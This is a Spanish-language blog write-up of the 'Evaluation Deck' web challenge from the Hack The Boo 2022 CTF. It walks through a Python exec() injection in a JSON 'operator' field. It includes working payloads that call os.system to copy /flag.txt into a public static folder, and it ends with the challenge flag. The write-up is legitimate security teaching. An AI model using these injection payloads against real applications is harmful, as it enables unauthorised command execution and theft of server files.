---
title: Hack The Boo 2022 - Evaluation Deck
layout: post
description: La resolución del reto "Evaluation Deck" del CTF "Hack The Boo 2022" organizado por Hack The Box.
tags:
- HackTheBox
- EvaluationDeck
- ctf
- post
- writeups
---
# Descripción
---

A powerful demon has sent one of his ghost generals into our world to ruin the fun of Halloween. The ghost can only be defeated by luck. Are you lucky enough to draw the right cards to defeat him and save this Halloween?

# Solución
---

El primer reto web del CTF nos presenta con un fantasma al que debemos derrotar seleccionando pares de cartas.

![](/images/images-hacktheboo2022/ed-1.png)

Tenemos un contador de turnos que disminuye por cada carta que elegimos, y también tenemos la vida del fantasma.

![](/images/images-hacktheboo2022/ed-2.png)

Si se nos acaban los turnos nos muestra una pantalla de "game over".

![](/images/images-hacktheboo2022/ed-3.png)

Si ganamos nos muestra una pantalla de "victory". 

Estas serían todas las funcionalidades de la aplicación web.

![](/images/images-hacktheboo2022/ed-4.png)

Muy entretenido el juego xD, pero necesitamos buscar una forma de conseguir la flag y no hemos encontrado ningún **input** donde podamos inyectar comandos, comillas o simbolos raros con el fin de romper algo. Por suerte el reto nos entrega el código fuente con un **dockerfile** para poder replicar la aplicación de manera local y así agilizar todo el testing.

Leyendo el archivo **Dockerfile** podemos saber que la flag se encuentra en `/flag.txt` y que la aplicación se encuentra en `/app`. Si queremos ver una imagen `card1.png` la ruta absoluta a esa imagen en el servidor es `/app/application/static/images/card1.png`, esta información nos servirá más tarde.

![](/images/images-hacktheboo2022/ed-5.png)

Leyendo el código nos encontramos con el uso de las funciones `compile()` y `exec()`, estas son funciones de python que pueden llegar a ser muy peligrosas.

![](/images/images-hacktheboo2022/ed-18.png)

Estas funciones se ejecutan cuando realizamos una petición a la ruta `/get_health` con el método `POST`.

![](/images/images-hacktheboo2022/ed-7.png)

Entendiendo el código vemos que primero debemos enviar un json, y después de comprobar que los datos son json la aplicación toma los valores de `current_health`, `attack_power` y `operator`. Es decir que nuestra petición debería verse así:

```perl
{
   "current_health": "algún valor",
   "attack_power": "algún valor",
   "operator": "algún valor"
}
```

En la tercera parte vemos que estos 3 valores se pasan directamente a la función `compile()` sin ningún filtro y el resultado de esto será ejecutado por la función `exec()`. Notamos que `current_health` y `attack_power` están dentro de una función `int()`, por lo tanto, estos dos valores solo pueden ser números. No podremos inyectar nada malicioso en estas dos variables o tendremos un error.

Así empezamos a construir nuestra inyección de comandos.

```perl
{
    "current_health": 10,
    "attack_power": 10,
    "operator": "inyección de comandos"
}
```

![](/images/images-hacktheboo2022/ed-8.png)

Para armar nuestras peticiones y probarlas en la aplicación web de forma más cómoda usaremos Postman.

Primero indicaremos la URL donde se encuentra la función que llamó nuestra atención anteriormente, cambiaremos el método a POST y agregaremos una nueva cabecera con el key `Content-Type` y el value `application/json`.

![](/images/images-hacktheboo2022/ed-35.png)

Vamos a la pestaña **Body** y cambiamos la opción de **none** a **raw** donde pegaremos el payload que creamos anteriormente.

```perl
{
    "current_health": 10,
    "attack_power": 10,
    "operator": "inyección de comandos"
}
```
Después de pegar nuestro payload haremos click en el botón **Send**.

![](/images/images-hacktheboo2022/ed-23.png)

Vemos que la petición falló basicamente porque el comando que construimos `10 inyección de comandos 10` no significa nada y produce un error.

![](/images/images-hacktheboo2022/ed-24.png)

Si ahora modificamos el valor de operator por una suma y le damos al botón de **Send** deberiamos obtener una respuesta correcta.

![](/images/images-hacktheboo2022/ed-25.png)

El comando que construimos es `10 + 10` y el servidor nos responde con un `20`.

![](/images/images-hacktheboo2022/ed-26.png)

Buscando formas de inyectar comandon en una función `exec()` nos encontramos con esta página de HackTricks [Link de la página](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#eval-ing-python-code)

Ingresamos el primer payload para ejecutar comandos.

```perl
{
   "current_health": 10,
   "attack_power": 10,
   "operator": "+  __import__('os').system('ls') +"
}
```

![](/images/images-hacktheboo2022/ed-27.png)

El servidor no nos arroja ningún error, pero tampoco podemos ver el output del comando.

![](/images/images-hacktheboo2022/ed-28.png)

La primera idea que tuve fue copiar y pegar la flag dentro de la carpeta del proyecto y así poder verla desde la página web con el siguiente comando:

```bash
cp /flag.txt > /app/application/static/flag.txt
```

```perl
{
   "current_health": 10,
   "attack_power": 10,
   "operator": "+  __import__('os').system('cp /flag.txt > /app/application/static/flag.txt') +"
}
```

![](/images/images-hacktheboo2022/ed-29.png)

Ahora el servidor no nos responde con 20, si no con 276, esto es porque suma el código de salida del comando. Si el comando se ejecutó correctamente el código de salida es 0, si ocurre algún error el número será mayor a 0. Podemos deducir que el comando falló.

![](/images/images-hacktheboo2022/ed-30.png)

Si vamos a la dirección donde supuestamente copiamos la flag no encontraremos nada.

![](/images/images-hacktheboo2022/ed-31.png)

Lo que hice fue crear un archivo llamado `flag.txt`.

```bash
touch /app/application/static/flag.txt
```

```perl
{
   "current_health": 10,
   "attack_power": 10,
   "operator": "+  __import__('os').system('touch /app/application/static/flag.txt') +"
}
```

Notamos que el comando se ejecutó correctamente ya que el resultado es 20, porque `10 + (código de estado del comando) + 10` es `20`.

![](/images/images-hacktheboo2022/ed-32.png)

Después ejecuté el comando `cat` a la flag y redirigí el output al archivo que creé.


```bash
cat /flag.txt > /app/application/static/flag.txt
```

```perl
{
   "current_health": 10,
   "attack_power": 10,
   "operator": "+  __import__('os').system('cat /flag.txt > /app/application/static/flag.txt') +"
}
```

![](/images/images-hacktheboo2022/ed-33.png)

Ejecutamos una petición GET al archivo donde acabamos de pegar el contenido de la flag `/static/flag.txt` y así obtenemos la flag.

![](/images/images-hacktheboo2022/ed-34.png)


# Flag
---

`HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}`
